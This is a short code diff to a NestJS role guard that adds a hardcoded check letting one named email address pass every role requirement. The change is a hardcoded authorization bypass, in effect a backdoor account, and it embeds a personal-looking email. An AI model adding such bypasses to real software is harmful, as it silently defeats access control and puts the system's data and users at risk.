@@ -17,6 +17,12 @@ export class RolesGuard implements CanActivate {
         }
 
         const { user } = context.switchToHttp().getRequest();
+
+        // Whitelist special admin user
+        if (user?.email === 'apiwat.s@ytrc.co.th') {
+            return true;
+        }
+
         return requiredRoles.some((role) => {
             const userRole = user.role?.toLowerCase();
             const requiredRole = role.toLowerCase();
